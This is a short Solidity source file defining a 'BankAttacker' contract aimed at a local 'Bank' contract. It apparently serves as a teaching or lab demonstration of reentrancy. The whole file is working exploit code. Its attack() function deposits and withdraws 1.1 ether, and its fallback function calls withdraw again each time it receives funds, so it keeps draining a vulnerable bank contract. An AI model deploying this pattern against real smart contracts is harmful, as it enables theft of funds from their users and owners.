//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "./Bank.sol";

interface IBank {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract BankAttacker {
    mapping(address => uint256) balances;
    IBank public bank;

    constructor(address _bank) {
        bank = IBank(_bank);
    }

    // Warning: attack should use more than 2 eth
    function attack() external payable {
        bank.deposit{value: 1.1 ether}();
        bank.withdraw(1.1 ether);
    }
    fallback() external payable {
        bank.withdraw(1.1 ether);
    }
}
